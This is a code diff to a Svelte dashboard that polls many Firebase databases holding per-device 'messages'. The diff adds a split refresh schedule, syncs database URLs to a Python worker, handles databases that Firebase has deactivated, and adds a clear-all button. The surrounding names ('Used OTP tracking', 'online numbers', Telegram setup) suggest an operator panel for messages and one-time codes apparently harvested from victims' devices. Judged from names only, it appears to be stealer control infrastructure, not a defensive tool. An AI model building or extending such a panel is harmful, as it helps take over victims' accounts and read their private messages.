@@ -139,9 +139,14 @@
   // path: where device keys live (root of messages)
   let connections = $state([]);
 
+  const FULL_REFRESH_INTERVAL_SECS = 120; // 2 minutes for all databases combined
+  const SELECTED_PANEL_INTERVAL_SECS = 10; // 10 seconds for active selected panel only
+
   let refreshInterval = $state(null);
+  let selectedPanelInterval = $state(null);
   let lastRefresh = $state(null);
-  let nextRefreshSecs = $state(10);
+  let nextRefreshSecs = $state(120);
+  let panelRefreshSecs = $state(10);
   let addOpen = $state(false);
   let form = $state({
     name: "",
@@ -862,11 +867,29 @@
     } catch {}
   }
 
+  // ── Sync active connections to Python Worker Config ────────────────────────
+  function syncConnectionsToWorker(conns) {
+    if (!Array.isArray(conns) || !conns.length) return;
+    try {
+      const activeUrls = conns
+        .filter(c => c && c.enabled !== false && c.url && !c.deactivated && !c.url.includes('newpanel-4412c'))
+        .map(c => c.url.replace(/\/+$/, ''));
+      if (activeUrls.length > 0) {
+        fetch('/api/worker-config', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ firebase_databases: activeUrls })
+        }).catch(() => {});
+      }
+    } catch {}
+  }
+
   // ── Save connections to localStorage ───────────────────────────────────────
   function saveConnections(conns) {
     try {
       localStorage.setItem("pd_connections", JSON.stringify(conns));
     } catch {}
+    syncConnectionsToWorker(conns);
   }
 
   // ── Used OTP tracking (localStorage) ─────────────────────────────────────
@@ -1262,6 +1285,7 @@
   // ── Fetch: shallow key list + device info ─────────────────────────────────
   async function fetchConn(conn, silent = false) {
     if (!conn.enabled) return;
+    if (silent && db[conn.id]?.deactivated) return;
     // Silent = keep existing data visible while fetching; only show loading on first fetch
     const hasData =
       db[conn.id]?.keys && Object.keys(db[conn.id].keys).length > 0;
@@ -1314,19 +1338,21 @@
 
       db = {
         ...db,
-        [conn.id]: { loading: false, error: null, keys, info, ts: new Date() },
+        [conn.id]: { loading: false, error: null, deactivated: false, keys, info, ts: new Date() },
       };
     } catch (e) {
+      const isDeact = String(e.message).includes('deactivated') || String(e.message).includes('423') || String(e.message).includes('Locked');
       db = {
         ...db,
         [conn.id]: {
           ...db[conn.id],
           loading: false,
-          error: e.message,
+          error: isDeact ? 'Database deactivated by Firebase (423 Locked)' : e.message,
+          deactivated: isDeact,
           ts: new Date(),
         },
       };
-      if (!silent) toast(`[${conn.name}] ${e.message}`, "error");
+      if (!silent) toast(`[${conn.name}] ${isDeact ? 'Database deactivated by Firebase' : e.message}`, "error");
     }
   }
 
@@ -1337,7 +1363,7 @@
     );
     bgRefreshing = false;
     lastRefresh = new Date();
-    nextRefreshSecs = 10;
+    nextRefreshSecs = FULL_REFRESH_INTERVAL_SECS;
     // After first load, capture baseline device keys so subsequent fetches can detect "new"
     if (!silent && baselineDeviceKeys.size === 0) {
       for (const c of connections) {
@@ -1345,6 +1371,28 @@
           baselineDeviceKeys.add(`${c.id}::${k}`);
         }
       }
+    }
+  }
+
+  // Refresh ONLY the single currently-selected panel every 10 seconds to drastically reduce network load
+  async function refreshSelectedPanel() {
+    if (!selectedConnId) return;
+    const conn = connections.find((c) => c.id === selectedConnId);
+    if (!conn || !conn.enabled || db[conn.id]?.deactivated) return;
+    await fetchConn(conn, true);
+    if (selectedKey && activeTab === 'device') {
+      try {
+        const { data } = await apiFetch(
+          conn,
+          `${conn.path}/${selectedKey}`,
+          "GET",
+          undefined,
+          { orderBy: '"$key"', limitToLast: "50" },
+        );
+        if (data && typeof data === 'object') {
+          msgs = data;
+        }
+      } catch {}
     }
   }
 
@@ -1405,7 +1453,13 @@
         localStorage.getItem("pd_connections") || "null",
       );
       if (Array.isArray(saved) && saved.length) {
-        connections = saved;
+        const cleaned = saved.filter(c => !c.url?.includes('newpanel-4412c'));
+        connections = cleaned;
+        if (cleaned.length !== saved.length) {
+          saveConnections(cleaned);
+        } else {
+          syncConnectionsToWorker(cleaned);
+        }
       }
     } catch {}
 
@@ -1413,13 +1467,24 @@
     tgInit();
 
     fetchAll(false); // first load: show loading state
-    refreshInterval = setInterval(() => fetchAll(true), 10_000); // bg silent auto-refresh every 10s
+    // 1. Combined full discovery & online numbers refresh across all databases every 2 minutes
+    refreshInterval = setInterval(() => fetchAll(true), FULL_REFRESH_INTERVAL_SECS * 1000);
+
+    // 2. Targeted fast refresh of ONLY the selected panel / active device every 10 seconds
+    selectedPanelInterval = setInterval(() => {
+      refreshSelectedPanel();
+      panelRefreshSecs = SELECTED_PANEL_INTERVAL_SECS;
+    }, SELECTED_PANEL_INTERVAL_SECS * 1000);
+
     const ticker = setInterval(() => {
       nowTick = Date.now();
       nextRefreshSecs = nextRefreshSecs > 0 ? nextRefreshSecs - 1 : 0;
+      panelRefreshSecs = panelRefreshSecs > 0 ? panelRefreshSecs - 1 : 0;
     }, 1000);
+
     return () => {
       clearInterval(refreshInterval);
+      if (selectedPanelInterval) clearInterval(selectedPanelInterval);
       clearInterval(ticker);
     };
   });
@@ -1989,6 +2054,19 @@
     ids.forEach(id => { const { [id]: _, ...rest } = db; db = rest; });
     if (fcSelected.size) fcSelected = new Set([...fcSelected].filter(id => !ids.includes(id)));
     toast(`Removed ${ids.length} failed connection${ids.length > 1 ? 's' : ''}.`, 'success');
+  }
+
+  function removeAllConns() {
+    if (!connections.length) return;
+    if (!confirm(`Remove ALL ${connections.length} Firebase connections from the panel?\nThis will clear all saved connections.`)) return;
+    connections = [];
+    saveConnections([]);
+    db = {};
+    fcSelected = new Set();
+    selectedConnId = null;
+    selectedKey = null;
+    activeTab = 'overview';
+    toast('All Firebase connections removed', 'success');
   }
 
   // ── Select device ─────────────────────────────────────────────────────────
@@ -2810,9 +2888,13 @@
         {:else if !connections.some((c) => db[c.id]?.loading)}
           <span
             class="refresh-cd"
-            title="Next auto-refresh in {nextRefreshSecs}s"
+            title={selectedConnId ? `Selected panel refreshes in ${panelRefreshSecs}s | All databases full sync in ${nextRefreshSecs}s` : `All databases full sync in ${nextRefreshSecs}s`}
           >
-            ↻ {nextRefreshSecs}s
+            {#if selectedConnId}
+              ↻ {panelRefreshSecs}s <span style="font-size:10px;opacity:0.65;">(all: {nextRefreshSecs}s)</span>
+            {:else}
+              ↻ {nextRefreshSecs}s
+            {/if}
           </span>
         {/if}
       </div>
@@ -4054,6 +4136,12 @@
               <button class="fc-act-btn fc-act-danger" onclick={removeFailedConns} title="Remove all {failedConns.length} failed connections">
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
                 Remove Failed ({failedConns.length})
+              </button>
+            {/if}
+            {#if connections.length > 0}
+              <button class="fc-act-btn fc-act-danger" onclick={removeAllConns} title="Remove all {connections.length} connections">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                Clear All ({connections.length})
               </button>
             {/if}
             <button class="fc-act-btn" onclick={copyAllConnUrls} title="Copy all Firebase URLs">
